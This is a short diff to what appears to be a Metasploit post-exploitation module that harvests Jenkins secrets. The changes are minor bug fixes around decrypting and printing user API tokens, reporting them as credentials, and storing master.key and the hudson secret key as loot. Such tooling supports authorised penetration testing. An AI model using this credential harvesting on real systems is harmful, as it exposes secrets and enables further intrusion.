@@ -34,7 +34,7 @@ class MetasploitModule < Msf::Post
   end
 
   def report_creds(user, pass)
-    return if user.empty? || pass.empty?
+    return if user.blank? || pass.blank?
     credential_data = {
       origin_type: :session,
       post_reference_name: self.fullname,
@@ -118,11 +118,12 @@ class MetasploitModule < Msf::Post
       api_token = decrypt(node.xpath("apiToken").text)
     end
 
-    print_good("API Token found - Username: #{username} Token: #{api_token}")
-
-    @api_tokens << [username, api_token]
-    report_creds(username, api_token)
-    store_loot("user-#{fname}", 'text/plain', session, f, nil, nil) if datastore['STORE_LOOT']
+    if api_token
+      print_good("API Token found - Username: #{username} Token: #{api_token}")
+      @api_tokens << [username, api_token]
+      report_creds(username, api_token)
+      store_loot("user-#{fname}", 'text/plain', session, f, nil, nil) if datastore['STORE_LOOT']
+    end
   end
 
   def parse_nodes(file)
@@ -289,8 +290,8 @@ class MetasploitModule < Msf::Post
     end
 
     if exists?(master_key_path) && exists?(hudson_secret_key_path)
-      @master_key = read_file(master_key_path).strip
-      @hudson_secret_key = read_file(hudson_secret_key_path).strip
+      @master_key = read_file(master_key_path)
+      @hudson_secret_key = read_file(hudson_secret_key_path)
 
       if datastore['STORE_LOOT']
         loot_path = store_loot('master.key', 'application/octet-stream', session, @master_key)
